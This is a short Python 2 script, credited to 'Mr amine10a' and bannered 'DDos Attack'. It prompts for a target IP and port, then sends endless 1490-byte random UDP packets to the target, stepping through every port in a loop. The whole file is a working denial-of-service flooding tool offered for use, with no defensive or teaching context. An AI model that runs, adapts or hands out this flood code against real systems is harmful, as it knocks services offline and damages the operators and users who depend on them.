g ='\033[92m'
r ='\033[91m'
b ='\033[94m'
y ='\033[93m'
w = '\033[0m'
m = '\033[95m'
bl = '\033[96m'
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
print(g)
os.system("clear")
os.system("apt install figlet -y")
os.system("figlet DDos Attack")
print(b)
print "Author   : Mr amine10a"
print "You Tube : https://m.youtube.com/channel/UCDbwhUmCPpRZwpFGI96yX4A"
print "github   : https://github.com/amine10a"
print "Facebook : https://www.facebook.com/Mr.amine10a"
print(r)
ip = raw_input("IP Target : ")
port = input("Port       : ")
print(y)
os.system("clear")
os.system("figlet Attack Starting")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

